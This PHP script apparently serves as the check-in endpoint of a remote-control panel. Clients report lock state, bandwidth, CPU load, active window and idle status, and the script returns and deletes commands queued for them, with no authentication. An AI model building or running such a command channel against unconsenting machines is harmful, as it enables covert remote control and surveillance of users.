<?php

include 'db.php';
if(!(isset($_POST["id"]) and isset($_POST["locked"]) and isset($_POST["bandrec"]) and isset($_POST["bandsent"]) and isset($_POST["cpuload"]) and isset($_POST["window"]) and isset($_POST["idle"]) )){echo "missing args!";http_response_code(403);exit();}
header("Content-type: text/plain");



$id=mysqli_real_escape_string($con,$_POST["id"]);
$locked=mysqli_real_escape_string($con,$_POST["locked"]);
$bandrec=mysqli_real_escape_string($con,$_POST["bandrec"]);
$bandsent=mysqli_real_escape_string($con,$_POST["bandsent"]);
$cpuload=mysqli_real_escape_string($con,$_POST["cpuload"]);
$window=mysqli_real_escape_string($con,$_POST["window"]);
$idle=mysqli_real_escape_string($con,$_POST["idle"]);



$i=time();
mysqli_query($con,"UPDATE clients SET currentbandrec='$bandrec' , currentbandsent='$bandsent' , status='$locked' , user_status='$idle' , window='$window' , currentcpu='$cpuload' , LastSeen=$i WHERE id='$id'");

//commands

$commands=@mysqli_query($con,"SELECT * FROM commands where id='$id'");
while ($row=@mysqli_fetch_array($commands)){echo $row["command"]."\n";}
@mysqli_query($con,"DELETE FROM commands where id='$id'");


?>